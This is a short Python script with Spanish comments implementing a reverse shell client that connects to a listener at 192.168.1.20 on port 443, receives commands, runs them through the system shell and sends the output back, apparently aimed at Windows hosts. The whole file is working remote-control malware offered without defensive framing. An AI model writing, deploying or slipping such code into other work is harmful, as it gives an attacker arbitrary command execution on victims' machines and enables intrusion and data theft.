#!/usr/bin/env python3

# Importación de módulos necesarios
import socket  # Para crear conexiones de red
import subprocess  # Para ejecutar comandos del sistema

# Función para ejecutar comandos del sistema y capturar su salida
def run_command(command):
    command_output = subprocess.check_output(command, shell=True)
    return command_output.decode("cp850")

if __name__ == '__main__':
    # Configuración inicial del socket del cliente
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # Conexión al servidor escuchador
    client_socket.connect(("192.168.1.20", 443))

    while True:
        # Recepción de comandos del escuchador
        command = client_socket.recv(1024).decode().strip()
        # Ejecución de los comandos y captura de la salida
        command_output = run_command(command)
        # Envío de la salida del comando de vuelta al escuchador
        client_socket.send(command_output.encode())

    # Cierre del socket del cliente
    client_socket.close()
